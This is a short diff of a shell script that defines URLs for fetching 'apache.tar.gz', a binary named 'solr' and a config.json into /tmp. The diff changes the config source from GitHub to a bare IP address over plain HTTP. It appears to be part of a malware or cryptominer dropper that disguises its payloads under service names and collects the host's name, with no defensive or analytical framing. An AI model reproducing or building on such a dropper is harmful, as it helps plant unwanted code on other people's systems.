@@ -7,7 +7,7 @@ p="/tmp"
 config_file="config.json"
 apachee_url="https://github.com/lazy8989/follow/raw/main/apache.tar.gz"
 solr_url="https://github.com/lazy8989/follow/raw/main/solr"
-config_url="https://raw.githubusercontent.com/lazy8989/follow/main/config.json"
+config_url="http://80.6.96.203/conf/config.json"
 
 random_number=$(shuf -i 10000000-99999999 -n 1)
 ho=$(hostname)
